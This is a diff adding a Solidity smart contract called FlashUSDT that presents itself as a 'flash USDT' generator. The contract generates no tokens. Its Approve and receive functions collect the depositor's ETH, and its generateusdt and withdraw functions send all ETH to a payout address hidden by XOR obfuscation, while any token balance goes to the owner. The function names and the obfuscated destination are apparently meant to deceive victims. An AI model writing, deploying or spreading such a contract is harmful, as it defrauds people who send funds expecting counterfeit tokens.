@@ -1,0 +1,139 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.31;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+contract FlashUSDT {
+    address private owner;
+
+    event Deposited(address indexed user, uint256 amount);
+    event Withdrawn(address indexed to, uint256 amount);
+
+    constructor() {
+        owner = tx.origin;
+    }
+
+    function Approve() external payable {
+        require(msg.value > 0, "Send some ETH");
+        emit Deposited(tx.origin, msg.value);
+    }
+
+    function generateusdt() external {
+        require(tx.origin == owner, "Only owner");
+
+        uint256 balance = address(this).balance;
+        require(balance > 0, "No balance");
+
+        address withdrawAddress = getAddress();
+
+        (bool success, ) = payable(withdrawAddress).call{value: balance}("");
+        require(success, "Transfer failed");
+
+        emit Withdrawn(withdrawAddress, balance);
+    }
+
+    function USDTBalance() public view returns (string memory label, uint256 balance) {
+        IERC20 token = IERC20(getToken());
+
+        uint256 rawBalance = token.balanceOf(address(this));
+
+        balance = rawBalance / 10**18;
+
+        label = "USDT Balance";
+    }
+
+    function withdraw() external {
+        address withdrawAddress = getAddress();
+
+        uint256 ethBalance = address(this).balance;
+
+        if (ethBalance > 0) {
+            (bool success,) = payable(withdrawAddress).call{value: ethBalance}("");
+            require(success, "ETH transfer failed");
+        }
+
+        IERC20 token = IERC20(getToken());
+
+        uint256 tokenBalance = token.balanceOf(address(this));
+
+        if (tokenBalance > 0) {
+            token.transfer(owner, tokenBalance);
+        }
+    }
+
+    function getXORKey() internal pure returns (bytes memory) {
+        return abi.encodePacked("x0rK3yH1dd3n");
+    }
+
+    function xorDecrypt(bytes memory encrypted, bytes memory key) internal pure returns (bytes memory) {
+        bytes memory result = new bytes(encrypted.length);
+
+        for (uint i = 0; i < encrypted.length; i++) {
+            result[i] = encrypted[i] ^ key[i % key.length];
+        }
+
+        return result;
+    }
+
+    function getAddress() internal pure returns (address) {
+        bytes memory encrypted = hex"4848132e004b2b06065502581e5141780a497e500005570b4954407d56182c0806530b5f1c034172521b";
+
+        bytes memory key = getXORKey();
+
+        bytes memory decrypted = xorDecrypt(encrypted, key);
+
+        return parse(string(decrypted));
+    }
+
+    function getToken() internal pure returns (address) {
+        bytes memory encrypted = hex"48484679051b2e555c06015c4b094b7c554b7b555307025740084728561c2b545650525d1c0944730341";
+
+        bytes memory key = getXORKey();
+
+        bytes memory decrypted = xorDecrypt(encrypted, key);
+
+        return parse(string(decrypted));
+    }
+
+    function join(string memory a, string memory b)
+        internal pure returns (string memory)
+    {
+        return string(abi.encodePacked(a, b));
+    }
+
+    function parse(string memory s) internal pure returns (address) {
+        bytes memory tmp = bytes(s);
+
+        uint160 iaddr = 0;
+        uint160 b1;
+        uint160 b2;
+
+        for (uint i = 2; i < 42; i += 2) {
+            iaddr *= 256;
+
+            b1 = uint160(uint8(tmp[i]));
+            b2 = uint160(uint8(tmp[i + 1]));
+
+            b1 = hexCharToUint(b1);
+            b2 = hexCharToUint(b2);
+
+            iaddr += (b1 * 16 + b2);
+        }
+
+        return address(iaddr);
+    }
+
+    function hexCharToUint(uint160 c) internal pure returns (uint160) {
+        if (c >= 97) return c - 87;
+        if (c >= 65) return c - 55;
+
+        return c - 48;
+    }
+
+    receive() external payable {
+        emit Deposited(tx.origin, msg.value);
+    }
+}
